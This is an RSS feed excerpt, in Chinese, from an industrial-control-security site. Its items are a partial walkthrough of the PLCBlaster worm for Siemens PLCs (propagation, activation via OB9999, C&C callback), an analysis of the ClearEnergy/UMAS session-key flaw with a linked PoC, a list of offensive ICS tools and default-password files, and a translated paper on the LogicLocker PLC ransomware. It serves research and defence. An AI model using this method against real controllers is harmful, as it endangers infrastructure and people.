+&lt;p&gt;如果TCON建立了连接则判断设备型号或者下载程序。由于TCON只需触发一次连接命令，就会一直尝试与目标建立连接，直到连接成功。因此，如果1s内没有建立连接则改变IP地址，尝试连接下一台PLC；如果建立了连接，则通过发送指令判断设备信号或者下载病毒程序，完成后改变IP地址，并尝试连接下一台设备。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcblaster/6.gif" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcblaster/7.gif" /&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;更改IP&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;断开连接后则更改IP地址，准备连接下一台设备&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcblaster/8.gif" /&gt;&lt;/p&gt;
+&lt;h3&gt;3. 传播感染&lt;/h3&gt;
+&lt;p&gt;连接建立后，病毒调用数据传送命令TSEND和数据接收命令TRCV进行传播。见下图&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcblaster/9.gif" /&gt;&lt;/p&gt;
+&lt;p&gt;程序块TSEND和TRCV的参数说明&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcblaster/10.gif" /&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;判断是否已感染&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;病毒在传播感染之前需要判断当前对象是否已经被感染，避免重复感染。判断是否被感染，如果感染，则跳过感染，如果未感染，则执行程序传送，感染对象。具体实现如下图：&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcblaster/11.gif" /&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;建立连接认证&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;在程序的发送过程中，需要满足S7协议的相关通信时序以及报文格式。下图为S7建立连接的过程。首先是TCP的三次握手，接下来建立COTP连接，建立完成后进行S7协议的连接建立。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcblaster/12.gif" /&gt;&lt;/p&gt;
+&lt;p&gt;具体逻辑实现代码如下：&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcblaster/13.gif" /&gt;&lt;/p&gt;
+&lt;h3&gt;4. 激活&lt;/h3&gt;
+&lt;p&gt;PLC执行顺序是从OB1开始，按顺序执行到OB9999的。&lt;/p&gt;
+&lt;p&gt;建立调用病毒程序的OB块OB9999，并将其存植入到目标PLC中，用以激病毒，并进行新的病毒传播感染。西门子PLC在运行时，会按照从OB1到OB9999的顺序进行调用。如下图所示。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcblaster/14.gif" /&gt;&lt;/p&gt;
+&lt;p&gt;在其他病毒块下载完成后，用OB9999（也可以用其他非系统自带的OB块，未了避免病毒的OB块与PLC中正常的OB块重复，建议块的序号尽量大些）启动病毒程序。&lt;/p&gt;
+&lt;h3&gt;5. 恶意功能的实现——连接C&amp;amp;C服务器&lt;/h3&gt;
+&lt;p&gt;一旦PLC被感染病毒，会基于TCP主动去连接C&amp;amp;C服务器。通过C&amp;amp;C服务器，可以远程控制PLC，包括PLC的启停，输出值的改变等。当C&amp;amp;C服务器向连接了C&amp;amp;C服务器的PLC发送指令后，PLC会解析命令并执行。以点灯程序为例说明其危害性。下图为C&amp;amp;C服务器点灯的解析部分：&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcblaster/15.gif" /&gt;&lt;/p&gt;
+&lt;h3&gt;6. 感染前后对比&lt;/h3&gt;
+&lt;p&gt;博途软件提供了PLC程序在线与离线差异的检测功能，如下图所示。程序块后面的绿色圆圈表示在线程序与离线程序一致，蓝色与橘黄色组成的圆形表示在线程序与离线程序不一致。块为虚样式，表示博途的程序中没有此块，而PLC有。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcblaster/16.gif" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcblaster/17.gif" /&gt;&lt;/p&gt;
+&lt;h2&gt;演示截图&lt;/h2&gt;
+&lt;p&gt;红灯表示PLC感染状态，绿灯表示PLC正常控制的终端运行状态，PLC使用的是西门子1200 V3版本，从左到右分别为PLC0，PLC1，PLC2。默认情况下，PLC1和PLC2离线的，当PLC0被感染后，PLC1和PLC2接入网络，随后PLC0就会感染PLC1和PLC2。&lt;/p&gt;
+&lt;p&gt;图1：PLC处于正常运行状态&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcblaster/20.png" /&gt;&lt;/p&gt;
+&lt;p&gt;图2：PLC0被感染病毒，反向联接C&amp;amp;C服务器&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcblaster/21.png" /&gt;&lt;/p&gt;
+&lt;p&gt;图3：PLC1与PLC2联网，PLC0正在感染PLC1&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcblaster/22.png" /&gt;&lt;/p&gt;
+&lt;p&gt;图4：PLC1被感染病毒，反向联接C&amp;amp;C服务器&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcblaster/23.png" /&gt;&lt;/p&gt;
+&lt;p&gt;图5：PLC2被感染病毒，反向联接C&amp;amp;C服务器&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcblaster/24.png" /&gt;&lt;/p&gt;
+&lt;h2&gt;防护措施&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;部署控制设备管理系统，定期对PLC控制逻辑代码进行备份，一旦PLC被感染，可以迅速通过备份的PLC程序重置进行快速恢复。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;设置CPU访问密码，禁止非授权用户上下载逻辑代码，密码一定不能是弱口令。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;对工控网络进行风险评估，识别核心资产，根据不同安全级别进行安全分区，一旦受到网络攻击，将损失控制在最小的范围内。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;在工控系统中安装工控监测审计系统，通过工控协议深度解析，根据特征值的进行采集、分析与识别，如发现异常数据包，如控制器启停、程序上下载，则记录日志或报警。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;安全域边界安装工控防火墙，通过工控防火墙，对异常数据包进行检测以及隔离防护。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;针对工控网络制定应急处理预案，当遇见突发网络攻击事件，可以实现快速恢复。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">w3h</dc:creator><pubDate>Thu, 11 May 2017 14:36:00 +0800</pubDate><guid>tag:icsmaster.com,2017-05-11:security/plcblaster.html</guid><category>工控安全</category></item><item><title>工业控制系统ClearEnergy勒索软件攻击</title><link>http://icsmaster.com/security/ClearEnergy.html</link><description>&lt;h2&gt;1、背景&lt;/h2&gt;
+&lt;p&gt;今年2月份佐治亚理工学院电气和计算机工程学院的科学家们在有限的范围内模拟了一个概念勒索软件（LogicLocker），主要目的是使用勒索软件的攻击手法来攻击关键基础设施、SCADA和工业控制系统。（此研究前期跟踪过，&lt;a href="http://icsmaster.com/news/Ransomware%20for%20Industrial%20Control%20Systems.html"&gt;链接&lt;/a&gt;）
+这只是一个模拟测试，仅仅过了1个多月，针对可编程逻辑控制器（PLC）中梯形图逻辑图的勒索软件攻击已经成型，代号&lt;strong&gt;ClearEnergy&lt;/strong&gt;。针对工控系统的勒索软件攻击发展之快，但防御措施的推进如此艰难和缓慢，真令人担忧啊。&lt;/p&gt;
+&lt;h2&gt;2、介绍&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;ClearEnergy&lt;/strong&gt;，攻击主要对象是关键基础设施、SCADA和ICS系统，是勒索软件攻击的一种（勒索软件是一种恶意软件，它以强大的加密算法感染计算机并加密其内容，然后要求赎金来解密该数据。）。一旦在受害机器上执行ClearEnergy，它将搜索易受攻击的可编程逻辑控制器（PLC），以便从PLC抓取梯形图逻辑图，并尝试将其上传到远程服务器。最后，ClearEnergy将启动一个定时器，它将触发一个进程，在一小时后从所有PLC中擦除逻辑图，除非受害者为了取消定时器并停止攻击而支付赎金。&lt;/p&gt;
+&lt;p&gt;勒索软件ClearEnergy影响响范围非常大，设备包括Schneider Electric Unity系列PLC和2.6版及更高版本的Unity OS，还包括GE和Allen-Bradley（MicroLogix系列），这些产品也被发现易受勒索软件攻击的攻击。影响的企业包括核电厂和设备厂，水和废物设施，运输基础设施等。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="ALT" src="/static/images/clearenergy/ClearEnergy-banner.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;ClearEnergy攻击主要使用漏洞CVE-2017-6032（SVE-82003203）和CVE-2017-6034（SVE-82003204），该漏洞是施耐德电气公司的UMAS协议中的严重的安全漏洞。 UMAS协议由于协议会话密钥设计不良，仅一个字节长度（256种可能性），导致攻击者轻松猜测会话密钥，甚至可以嗅探。使用会话密钥，攻击者能够完全控制控制器，读取控制器的程序并用恶意代码重写。勒索软件ClearEnergy影响了世界上最大的SCADA和工业控制系统制造商的大量PLC型号。这包括Schneider Electric Unity系列PLC和2.6版及更高版本的Unity OS，其他领先供应商的PLC型号包括GE和Allen-Bradley（MicroLogix系列），这些产品也被发现易受勒索软件攻击的破坏。&lt;/p&gt;
+&lt;p&gt;目前，施耐德电气已经证实，Modicon系列PLC产品容易受到CRITIFENCE提出的发现，并发布了重要的网络安全通知（SEVD-2017-065-01）。国土安全部（ICS-CERT）今天也发布了一项重要的通告。&lt;/p&gt;
+&lt;h2&gt;3、验证&lt;/h2&gt;
+&lt;p&gt;施耐德电气使用的UMAS协议格式如下图所示：&lt;/p&gt;
+&lt;p&gt;&lt;img alt="ALT" src="/static/images/clearenergy/modbus_protocol.gif" /&gt;&lt;/p&gt;
+&lt;p&gt;通过我们工控安全实验室的实际环境（Sichneider Quantum系列）截取的数据包如下图所示，可以获取通信的Seesion是0xb8：&lt;/p&gt;
+&lt;p&gt;&lt;img alt="ALT" src="/static/images/clearenergy/ssession.gif" /&gt;&lt;/p&gt;
+&lt;p&gt;利用获取的Session通过任意一台电脑可以发送控制CPU启停的命令以及程序上下载（POC见参考[4] &lt;strong&gt;（POC请勿在实际环境中测试，否则后果自负）&lt;/strong&gt;），如下图所示：&lt;/p&gt;
+&lt;p&gt;&lt;img alt="ALT" src="/static/images/clearenergy/session_stop_cpu.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;使用Session发送Stop数据包后控制器Cpu进入Stop状态，如下图所示：&lt;/p&gt;
+&lt;p&gt;&lt;img alt="ALT" src="/static/images/clearenergy/stop.jpeg" /&gt;&lt;/p&gt;
+&lt;h2&gt;4、参考&lt;/h2&gt;
+&lt;p&gt;[1] ClearEnergy Critical Infrastructure, SCADA and Industrial Control Systems ransomware analysis based on Modicon Modbus Protocol / UMAS - Session Key (0-Day Vulnerabilities)  &lt;a href="http://www.critifence.com/blog/clear_energy/index.php?download_report"&gt;链接&lt;/a&gt;
+[2] ClearEnergy ransomware aim to destroy process automation logics in critical infrastructure, SCADA and industrial control systems. &lt;a href="http://securityaffairs.co/wordpress/57731/malware/clearenergy-ransomware-scada.html"&gt;链接&lt;/a&gt;
+[3] Cybersecurity Notification – Modicon Family of PLCs &lt;a href="http://download.schneider-electric.com/files?p_enDocType=Technical+leaflet&amp;amp;p_File_Id=7046260565&amp;amp;p_File_Name=SEVD-2017-065-01+Modicon+PLC+Family.pdf&amp;amp;p_Reference=SEVD-2017-065-01"&gt;链接&lt;/a&gt;
+[4] POC下载地址 &lt;a href="https://github.com/w3h/icsmaster/blob/master/exploit/MODBUS_REMOTE_COMMAND_TOOL.py"&gt;链接&lt;/a&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">W3H</dc:creator><pubDate>Sat, 08 Apr 2017 14:36:00 +0800</pubDate><guid>tag:icsmaster.com,2017-04-08:security/ClearEnergy.html</guid><category>勒索软件</category></item><item><title>工控安全工具集</title><link>http://icsmaster.com/tool/icstools.html</link><description>&lt;div class="highlight"&gt;&lt;pre&gt;本文所提到的相关部分工具具有攻击性，请务在真实环境中使用，否则后果自负。点击标题即可下载。
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2&gt;1、S7 Client Demo&lt;/h2&gt;
+&lt;p&gt;开源的S7协议库”snap7“基础上进行开发的，主要支持西门子的S7-300/s7-400设备，可以直接连接西门子的控制器，获取控制器上的设备信息（如固件版本，块信息等），还可以直接操作控制器的CPU的启停。&lt;a href="https://github.com/w3h/icsmaster/tree/master/tool/s7clientdemo.rar"&gt;下载地址&lt;/a&gt;
+&lt;img alt="Alt text" src="/static/images/icstools/1.gif" title="=100*100" /&gt;&lt;/p&gt;
+&lt;h2&gt;2、PLCSCAN&lt;/h2&gt;
+&lt;p&gt;通过探测设备，获取关于设备的供应商类型、模块信息等，目前仅支持S7协议与MODBUS协议。&lt;a href="https://github.com/w3h/icsmaster/tree/master/tool/plcscan.rar"&gt;下载地址&lt;/a&gt;
+&lt;img alt="Alt text" src="/static/images/icstools/2.gif" title="=100*100" /&gt;&lt;/p&gt;
+&lt;h2&gt;3、QTester104&lt;/h2&gt;
+&lt;p&gt;使用QT和C++实现IEC104通讯规约，可以连接IEC104的设备。&lt;a href="https://github.com/w3h/icsmaster/tree/master/tool/qtester104-v1.18.zip"&gt;下载地址&lt;/a&gt;
+&lt;img alt="Alt text" src="/static/images/icstools/3.gif" /&gt;&lt;/p&gt;
+&lt;h2&gt;4、S7-Brute-Offline&lt;/h2&gt;
+&lt;p&gt;S7密码离线暴力破解工具。&lt;a href="https://github.com/w3h/icsmaster/tree/master/tool/s7-brute-offline.py"&gt;下载地址&lt;/a&gt;
+&lt;img alt="Alt text" src="/static/images/icstools/4.gif" /&gt;&lt;/p&gt;
+&lt;h2&gt;5、SCADA_Metasploit_Modules&lt;/h2&gt;
+&lt;p&gt;列举了MSF上所有的针对工业控制系统的漏洞脚本。&lt;a href="https://github.com/w3h/icsmaster/tree/master/SCADA_Metasploit_Modules.csv"&gt;下载地址&lt;/a&gt;
+&lt;img alt="Alt text" src="/static/images/icstools/5.gif" /&gt;&lt;/p&gt;
+&lt;h2&gt;6、Scada_Password&lt;/h2&gt;
+&lt;p&gt;列举了工业控制系统中的常见的用户和密码。&lt;a href="https://github.com/w3h/icsmaster/tree/master/Scada_Password.csv"&gt;下载地址&lt;/a&gt;
+&lt;img alt="Alt text" src="/static/images/icstools/6.gif" /&gt;&lt;/p&gt;
+&lt;h2&gt;7、Scada_Dorks&lt;/h2&gt;
+&lt;p&gt;收集针对工业控制系统中常见的DORK。&lt;a href="https://github.com/w3h/icsmaster/tree/master/Scada_Dorks.csv"&gt;下载地址&lt;/a&gt;
+&lt;img alt="Alt text" src="/static/images/icstools/7.gif" /&gt;&lt;/p&gt;
+&lt;h2&gt;8、Scapy&lt;/h2&gt;
+&lt;p&gt;Scapy的是一个强大的交互式数据包处理程序（使用python编写）。它能够伪造或者解码大量的网络协议数据包，能够发送、捕捉、匹配请求和回复包等等。它可以很容易地处理一些典型操作，比如端口扫描，tracerouting，探测，单元测试，攻击或网络发现（可替代hping，NMAP，arpspoof，ARP-SK，arping，tcpdump，tethereal，P0F等）。最重要的他还有很多更优秀的特性——发送无效数据帧、注入修改的802.11数据帧、在WEP上解码加密通道（VOIP）、ARP缓存攻击（VLAN）等，这也是其他工具无法处理完成的。
+该工具主要用于工控协议解析，常用协议攻击（如tcp_land、arp fload等），工控协议FUZZ测试和漏洞利用脚本的编写。&lt;a href="https://github.com/secdev/scapy.git"&gt;下载地址&lt;/a&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">W3H</dc:creator><pubDate>Thu, 23 Feb 2017 15:24:00 +0800</pubDate><guid>tag:icsmaster.com,2017-02-23:tool/icstools.html</guid><category>工具</category></item><item><title>失控：工业控制系统勒索软件</title><link>http://icsmaster.com/news/Ransomware%20for%20Industrial%20Control%20Systems.html</link><description>&lt;div class="highlight"&gt;&lt;pre&gt;本文由工匠实验室翻译，非官方中文译文，原文《Out of Control: Ransomware for Industrial Control Systems》。
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;blockquote&gt;
+&lt;p&gt;摘要 – 勒索软件最近成为网络犯罪的热门新商业模式，对医院进行了高调攻击，揭示了操作关键资产用于获取勒索赎金盈利的技术。同时，由于没有感觉到威胁和现实世界针对ICS攻击的案例较少，工业控制系统（ICS）网络仍然在努力更新其安全措施。 最近的报告表明，ICS网络可能是勒索软件瞄准的下一个领域，但迄今为止所有的攻击只是使用标准的勒索软件攻击个人计算机，攻击的效果有限。 本研究工作中，我们开发了针对可编程逻辑控制器（PLC）的第一个已知版本的勒索软件，讨论这种攻击的经济影响，并为ICS勒索软件设计了一个通用框架，以帮助未来的研究和防御。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2&gt;1、介绍&lt;/h2&gt;
+&lt;p&gt;工业控制系统（ICS），如提供电力给灯，处理和分配我们从水管喝的水以及制造我们认为理所当然的所有物质产品，迄今为止恶意软件基本上没有涉足，即使数据泄露和企业系统的黑客已经定期成为头条新闻。 发生的几个典型的ICS攻击，例如伊朗核电震网攻击（Stuxnet）和乌克兰停电，都是针对性攻击，实现类似军事目标，而不是经济利益。 然而，近年来显示，大多数恶意软件作者和网络犯罪分子不是国家赞助的军队的阴影武器，而是由财务收益驱动的犯罪分子，他们通过销售和分发恶意软件，僵尸网络和售卖被盗信用卡信息。
+ICS网络迄今为止在很大程度上避免了成为网络犯罪的目标，并不是因为它们本质上很安全。事实上，根据卡巴斯基安全情报组（参见参考资料[4]）在2016年7月报告中详细描述的猖獗的漏洞和不安全的协议，他们仍然是非常不安全，甚至似乎没有改善。对这种脆弱下的安全的唯一解释是，网络犯罪分子还没有想出如何将他们的业务转化为一个有利可图的商业模式。在典型的企业环境中，对受害者最重要的“如视珍宝”的是公司的数据，恰好这也是攻击者的目标，这就说明了最近勒索软件为什么为取得如此大的成功。然而，在ICS环境中，在制造设施中可能存在一些有价值的知识产权数据，但在电网，水处理和分配以及天然气公用事业中并不多。在这些领域中，公司的“如视珍宝”的最重要的不是任何类型的数据，而是其设施的持续可用性和安全运行。例如，2003年的著名的停电事件影响了美国东北部，并且是由一个简单的软件缺陷造成的，估计的经济成本为7到10亿美元（参见参考资料[3]）。制造设施（参见参考资料[16]）每小时的系统停机可能会造成数百万美元损失，并且甚至难以衡量家用水龙头或者任何设备流出非干净的水带来的经济损失。考虑到这些经济方面，本文探讨为什么ICS网络可能是勒索软件的下一个目标，我们为可编程逻辑控制器（PLC）（名为LogicLocker）开发了跨厂商勒索软件蠕虫的第一个已知示例。 LogicLocker使用Schneider Modicon M241上的原生套接字API来扫描已知易受攻击目标的网络，即Allen Bradley MicroLogix 1400 PLC和Schneider Modicon M221 PLC，并通过绕过其弱认证机制来感染它们，从而锁定合法用户，为了避免轻松恢复PLC ，用逻辑炸弹替换了程序，如果不及时支付赎金，该炸弹开始操作危险地输出，制造永久性损坏或者伤害人类。
+这项工作的主要贡献包括：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;工业控制网络中的可编程控制器（PLC）的第一个已知勒索软件实例&lt;/li&gt;
+&lt;li&gt;可编程控制器（PLC）的第一个跨厂商蠕虫的概念论证&lt;/li&gt;
+&lt;li&gt;传统勒索软件和ICS勒索软件的经济学的详细比较&lt;/li&gt;
+&lt;li&gt;Shodan上目前可以发现的易受这种攻击影响的设备的调查&lt;/li&gt;
+&lt;li&gt;解释ICS勒索软件的通用框架，以帮助未来的研究和防御&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;本文的其余部分安排如下。 第二节介绍了勒索软件和ICS安全领域的相关工作。 第三节描述了我们假设实施这种勒索软件攻击的确切威胁模型，第四节解释了为什么ICS是勒索软件的下一个目标。第五节给出Shodan上最流行的控制器的调查，第六节分析攻击原理，第七节解释LogicLocker和通用ICS勒索软件。 最后，第八节建议对这种攻击提出抗辩，第九节总结结论。&lt;/p&gt;
+&lt;h2&gt;2、相关工作&lt;/h2&gt;
+&lt;p&gt;勒索软件多年来发生了显着变化，恶意软件作者已经学习和调整了他们的分发方法，勒索受害者的方法，以及他们用来持有赎金资产的技术。 在1989年观察到勒索软件的第一个已知例子，当艾滋病毒木马通过纸质邮件分发到软盘上时。 尽管攻击方法具有新颖性，但是由于各种原因，包括无效的分发，小目标池，广泛的强加密无法访问以及国际支付方面的麻烦，这种活动很不成功。
+在关于勒索软件演变的赛门铁克报告（参见参考资料[13]）中，勒索软件被分为四种主要类型。第一次流行的勒索软件以假应用程序的形式出现，承诺在受害者的计算机中以小额费用修复虚构问题。接下来，攻击者增加了对受害者的假设的威胁，假冒伪造的防病毒程序有希望清除所有的发现与扫描到的感染。随着一般用户变得更加技术和更好地发现这些骗局，攻击者变得更加积极，并开始锁定用户的计算机，通常利用一些执法机构强迫他们支付罚款。再次，一般用户开始学习如何检测这些骗局和合法的安全产品被发布恢复受害者的电脑，没有支付赎金。为了弥补以前在勒索软件中的所有弱点，攻击者最终转移到了加密勒索，以更强的控制受害者的有价值的资产，并放弃试图欺骗用户，而不是选择公开要求付款或他们的数据将被销毁。
+正是这种加密的勒索软件最近成为头条新闻，敲诈大笔赔偿10,000美元，恢复公立学校区的记录到17,000美元，在医院恢复病人记录（参见参考资料[15]）。联邦调查局估计勒索软件在2015年的成本美国总共2400万美元，成本在2016年前三个月大约2.09亿美元（参见参考资料[8]）。随着网络犯罪分子明显抓住勒索软件的盈利能力，他们似乎开始将ICS网络视为下一个潜在的受害者。在Fortinet（参见参考资料[12]）今年发布的一份报告中，有证据表明，攻击者似乎改造了他们的标准加密勒索，并特别针对他们在制造设施。 Booz Allen Hamilton的另一份报告（参见参考资料[5]）将这一概念推进了一步，推测勒索软件不仅转移到制造业，而且转向攻击PLC本身而不是个人计算机。作为这些预测的真实性的进一步证据，世界正在看到著名的勒索软件攻击越来越接近控制系统。在2016年11月，旧金山的Muni交通系统的售票机被感染了勒索软件，花费几天时间来恢复，并允许乘客在繁忙的感恩节假期周末自由乘坐（参见参考资料[9]）。然后，在2017年1月下旬，据报告，勒索软件感染了一个豪华的奥地利酒店，阻止了给客人制作新的房间钥匙卡，基本上锁定他们的房间。由于每个酒店房间每晚花费高达几百美元，受害者决定支付大约1600美元的攻击者来恢复系统并继续正常的业务操作（参见参考资料[7]）。虽然还没有任何已知的勒索软件攻击PLC，但还是用其他方式攻击了控制系统。以PLC作为目标的第一个已知恶意软件是Stuxnet，它在2010年被发现重新编程控制伊朗离心机的PLC，并通过篡改旋转速度来销毁它们（参见参考资料[11]）。其他概念证明的攻击已经在黑帽会议上展示，将PLC变成具有自传播蠕虫功能的端口扫描器（参见参考资料[10]）。&lt;/p&gt;
+&lt;h2&gt;3、威胁模型&lt;/h2&gt;
+&lt;p&gt;本文为勒索软件建议的威胁模型是有组织的网络犯罪，而不是国家支持的攻击者或不熟练的脚本小子。这种区别在攻击的可能性，攻击的动机和目标以及攻击者的技能水平方面是重要的。作为网络安全的普遍规则，攻击者的复杂程度与攻击的频率成反比，其中不熟练的攻击者简单地复用流行的漏洞攻击代码构成了大多数攻击，其次是专业网络犯罪，然后是罕见的国家发起的攻击。在本文中，攻击者被假定为具有在网络通信应用层上操控PLC的足够技能的网络犯罪分子，但缺乏在固件级别为他们想要攻击的每个模型PLC开发利用的技能，资源或动机。通过保持对应用层的攻击，他们能够针对更广泛的受害设备，从而提高他们的预期收益。
+网络犯罪攻击者的高级目标是使受害者从系统停机时间中获得足够的收入，并对人员和昂贵的设备造成足够的损害，使得支付赎金比恢复设施运行的其他手段更具吸引力。他通过窃取原有的PLC程序，使用第六节C部分中描述的方法锁定PLC，加密原始程序，以及在PLC代码中添加如果不在指定的时间支付赎金就开启危险的输出量的逻辑炸弹，。此外，最终目标是采取上述两种形式，这取决于攻击者的知识水平。在第一种情况下，攻击者很少或根本不知道控制系统背后的基本物理过程，并且将不稳定地操作所有输出量，以期造成物理损坏。在第二种情况下，对物理过程执行侦察的更有见识的攻击者将精确地知道操作哪些输出量，并且可以在触发逻辑炸弹之前智能地尝试将系统移动到更脆弱的状态。&lt;/p&gt;
+&lt;h2&gt;4、勒索软件的经济学&lt;/h2&gt;
+&lt;p&gt;勒索软件攻击对医院如此成功的一个主要原因是，医院需要患者的数据进行正常运营和为患者提供护理。 工业控制系统遭受类似的需求，绝对需要控制其PLC以继续操作他们的系统，从而为人们的家庭提供电力或制造其产品。&lt;/p&gt;
+&lt;p&gt;A.  传统勒索软件与工业控制系统勒索软件对比&lt;/p&gt;
+&lt;p&gt;传统的勒索软件攻击者根据其窃取的数据的价值以及他们瞄准的受害者的人数，仔细考虑了所需的付款，仔细平衡公式“利润=受害人数*价值 – 成本“，以确保保持盈利。一方面，典型的互联网用户，他的照片和个人文档加密，将被要求支付数百美元。考虑到攻击者发起攻击所需的成本或努力，发送大量钓鱼电子邮件，欺骗许多受害者下载勒索软件有效载荷相对便宜。数据的重要性通常不会危及生命，因此只有大约一半的受害者最终支付赎金[6]。即使如此，这种已知的攻击对攻击者仍是有利可图的。因此，当攻击更小的更具体的目标时，只有攻击者所拥有的价值足以弥补了较小的受害人数，该活动才会成功。
+另一方面，公司的数据是必须继续正常经营的企业。攻击者妥协的目标较少，但是利益较高，为了平衡权衡，他可以要求数千美元的赎金，仍然导致利润。根据目标，攻击者危害受害者的成本范围从高，对于具有强安全措施的业务，或对于无准备业务的低。通过针对具有传统薄弱的安全实践的网络（例如医院，学校和ICS网络），攻击者将其成本保持在较低水平，并且利润率很高。工业控制系统是一个相对较小的目标集合，所以无论攻击者为赎金持有的资产都必须足够有价值，以便在他有利的情况下仍然平衡权衡方程。 ICS网络通常没有有价值的数据，而是将宕机，设备健康和人员安全的最高价值。因此，勒索软件的作者可以威胁所有三个人提高权衡方程的价值侧，使ICS勒索软件获利。
+停机时间。根据受害者的行业，停机时间可能对利润造成轻微或灾难性影响。如前所述，汽车制造商估计每小时停机损失数百万美元的收入，大规模停电可能攀升到几十亿美元的成本。在ICS网络上成功的勒索软件攻击将通过停止操作以及通过窃取PLC上的程序并锁定用户而阻止恢复工作，从而以不可接受的停机时间威胁受害者。此外，如果诸如易腐食品制造的某些过程被勒索软件中断，由于必须冲洗出系统，重新安排设备并在恢复PLC之后重新启动整个过程，受害设备会遭受额外的停机时间。
+重要的是要注意，许多设施，特别是小型企业，不对自己的PLC进行编程，而是向第三方原始设备制造商（OEM）或系统集成商支付费用。因此，一旦PLC被感染，恢复不是从头重新刷新固件并重新加载旧程序的简单事情。在某些情况下，第三方编写的程序是他们希望保密的专有软件，这意味着受害设施将不会有程序的备份副本。然后受害者必须联系他们的OEM或集成商并安排维护以修复PLC，可能在过程中增加几天的停机时间。此外，恢复努力的可能性还假定执行编程的各方仍然在业务中并且保持对所有节目的准确备份。最后，攻击者可以妥协的PLC越多，他可以延长恢复过程，导致更多的停机时间，增加他提供的立即恢复的吸引力。
+设备健康。 ICS网络的独特特征之一是攻击者还可以与网络的物理世界进行交互，例如加速离心机或打开阀门以泄漏危险化学品。 ICS设备中的损坏设备不仅昂贵，更换或维修，使系统恢复在线所需的停机时间由于生产损失而增加了更多的成本。 成功的勒索软件攻击将包括PLC代码中的逻辑炸弹，其开始操作所连接的机械，目的是造成对设备的物理损坏。 通过执行网络侦察以尝试理解底层物理过程，将系统移动到脆弱状态，以及智能地操作输出以造成最大损害，可以提高这种逻辑炸弹的有效性。
+人类安全。 其中一个攻击者从医院学习勒索软件攻击是，当人类在线时，公司愿意支付更高的价格，以确保他们的安全和健康。 因此，威胁设备健康的逻辑炸弹也通过威胁任何附近人员的安全，为攻击增加了更多的价值。
+表I总结并比较了最近流行的加密勒索品系和提议的ICS勒索软件之间的类似方面。 同样，我们要强调的事实是，当前的加密勒索已部分有利可图，因为大多数受害者不定期备份他们的数据，因此不能简单地擦除他们的计算机和恢复数据。 类似地，不清楚PLC程序是如何备份的，并且如果备份可用的恢复程序可能涉及更昂贵的停机时间和可能的设备修理。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/Ransomware_41.gif" /&gt;&lt;/p&gt;
+&lt;h2&gt;5、目标的脆弱性&lt;/h2&gt;
+&lt;p&gt;除了勒索赎金的数据的关键性质，医院是勒索软件的首要目标的另一个原因是他的安全状态较弱。 同样，在供应商级别和设施级别的ICS网络遭受类似的有缺陷的理念，即不将恶意软件视为现实的威胁，因此他们的网络是更加脆弱。&lt;/p&gt;
+&lt;p&gt;A.  基于Shodan搜索引擎的设备调查&lt;/p&gt;
